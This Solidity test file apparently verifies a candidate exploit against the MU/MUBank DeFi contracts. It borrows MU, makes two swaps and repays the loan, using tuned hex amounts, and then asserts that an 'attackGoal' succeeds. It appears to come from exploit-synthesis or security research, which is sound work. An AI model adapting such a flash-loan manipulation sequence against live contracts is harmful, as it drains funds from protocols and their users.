// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./MUMUG.t.sol";

contract MUMUGVerify is MUMUGTest {
    function test_verify_cand002_0() public {
        uint256 amt0 = 0x4eebf0000009c018800a;
        uint256 amt1 = 0xf6e21b69e58819ed7c2;
        uint256 amt2 = 0x57e130044480192f704;
        uint256 amt3 = 0x4efc09b3f676f31c9830;
        borrow_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_mubank_usdce_mu(amt2);
        payback_mu(amt3);
        require(attackGoal(), "Attack failed!");
    }
}
